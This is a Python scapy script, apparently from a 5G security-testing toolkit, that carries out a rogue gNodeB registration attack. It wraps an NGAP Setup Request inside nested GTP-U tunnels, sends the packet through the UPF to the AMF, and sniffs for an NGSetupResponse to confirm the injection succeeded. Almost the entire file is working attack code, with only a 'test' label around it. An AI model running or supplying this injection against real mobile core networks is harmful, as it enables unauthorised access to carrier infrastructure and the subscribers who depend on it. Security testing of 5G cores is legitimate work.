#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scapy.layers.inet import IP, UDP
from scapy.layers.sctp import SCTP
from scapy.packet import Raw
from scapy.sendrecv import sniff, send
from scapy.contrib.gtp import GTPHeader
import logging
from core.config import TEST_CONFIG, validate_config
from protocol.protocol_layers import craft_ngap_setup_request
 
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def craft_gtpu_tunnel(outer_src_ip, outer_dst_ip, outer_teid, inner_src_ip, inner_dst_ip, inner_teid, inner_payload):
    try:
        inner_gtpu = GTPHeader(teid=inner_teid, gtp_type=255) / IP(src=inner_src_ip, dst=inner_dst_ip) / UDP(sport=2152, dport=2152) / Raw(load=inner_payload)
        outer_packet = IP(src=outer_src_ip, dst=outer_dst_ip) / UDP(sport=2152, dport=2152) / GTPHeader(teid=outer_teid, gtp_type=255) / inner_gtpu
        return outer_packet
    except Exception as e:
        logger.error(f"Failed to craft GTP-U tunnel: {e}")
        return None

def craft_ngap_injection(amf_ip, amf_port=38412):
    try:
        ngap_payload = craft_ngap_setup_request()
        sctp = IP(dst=amf_ip) / SCTP(sport=38412, dport=amf_port) / Raw(load=ngap_payload)
        return bytes(sctp[SCTP])
    except Exception as e:
        logger.error(f"Failed to craft NGAP injection: {e}")
        return None

def rogue_gnodeb_register(upf_ip, outer_teid, amf_ip, inner_teid, iface=None, timeout=10):
    if iface is None:
        iface = TEST_CONFIG["interface"]
    
    validate_config()
    response_received = False
    
    try:
        ngap_setup = craft_ngap_injection(amf_ip)
        if not ngap_setup:
            logger.error("Failed to craft NGAP setup")
            return False
        
        tunnel_pkt = craft_gtpu_tunnel(
            outer_src_ip=TEST_CONFIG["outer_src"],
            outer_dst_ip=upf_ip,
            outer_teid=outer_teid,
            inner_src_ip=TEST_CONFIG["inner_src"],
            inner_dst_ip=amf_ip,
            inner_teid=inner_teid,
            inner_payload=ngap_setup
        )
        
        if not tunnel_pkt:
            logger.error("Failed to craft tunnel packet")
            return False
        
        send(tunnel_pkt, iface=iface, verbose=0)
        logger.info(f"Sent rogue gNodeB registration to {amf_ip}")
        
        def handle_resp(pkt):
            nonlocal response_received
            try:
                if pkt.haslayer(SCTP) and pkt.haslayer(Raw):
                    payload = bytes(pkt[Raw])
                    if len(payload) > 2 and payload[0] == 0x20 and payload[1] == 0x15:
                        logger.info("Received NGSetupResponse")
                        response_received = True
                        return True
            except Exception as e:
                logger.debug(f"Error processing response: {e}")
        
        logger.info(f"Listening for responses (timeout: {timeout}s)")
        sniff(iface=iface, filter="sctp port 38412", prn=handle_resp, timeout=timeout, store=0)
        
        if response_received:
            logger.info("Rogue gNodeB registration successful")
        else:
            logger.warning("No response received within timeout")
        
        return response_received
    except Exception as e:
        logger.error(f"Rogue gNodeB registration failed: {e}")
        return False

if __name__ == "__main__":
    logger.info("Starting rogue gNodeB registration test")
    rogue_gnodeb_register(
        TEST_CONFIG["upf_ip"],
        TEST_CONFIG["outer_teid"],
        TEST_CONFIG["amf_ip"],
        TEST_CONFIG["inner_teid"]
    )

